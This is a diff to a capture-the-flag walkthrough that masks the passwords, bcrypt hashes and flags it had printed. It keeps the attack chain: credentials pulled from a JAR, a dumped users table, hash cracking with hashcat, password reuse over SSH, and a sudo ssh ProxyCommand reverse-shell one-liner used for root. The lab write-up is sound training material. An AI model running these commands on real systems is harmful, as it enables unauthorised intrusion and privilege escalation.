@@ -30,11 +30,11 @@ Credential Leak (JAR → PostgreSQL)
 ├── /app/cloudhosting-0.0.1.jar → BOOT-INF/classes/application.properties
 │   └── postgres:<PASSWORD>
 ├── psql → SELECT * FROM users
-│   └── admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
-└── hashcat -m 3200 → admin:manchesterunited
+│   └── admin:<BCRYPT_HASH>
+└── hashcat -m 3200 → admin:<PASSWORD>
 
 User Flag (Password Reuse)
-├── ssh josh@10.129.229.88 → manchesterunited
+├── ssh josh@10.129.229.88 → <PASSWORD>
 └── cat user.txt → <USER_FLAG>
 
 Privilege Escalation (sudo ssh ProxyCommand)
@@ -42,6 +42,8 @@ Privilege Escalation (sudo ssh ProxyCommand)
 ├── sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/... 0>&1"' x
 └── root → cat /root/root.txt (<ROOT_FLAG>)
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -158,19 +160,19 @@ SELECT * FROM users;
 ```
 
 ```
-kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
-admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+kanderson | <BCRYPT_HASH> | User
+admin     | <BCRYPT_HASH> | Admin
 ```
 
 ```bash
-echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash_file
+echo '<BCRYPT_HASH>' > hash_file
 hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
-# manchesterunited
+# <PASSWORD>
 ```
 
 ```bash
 ssh josh@10.129.229.88
-# password: manchesterunited
+# password: <PASSWORD>
 cat user.txt
 # <USER_FLAG>
 ```
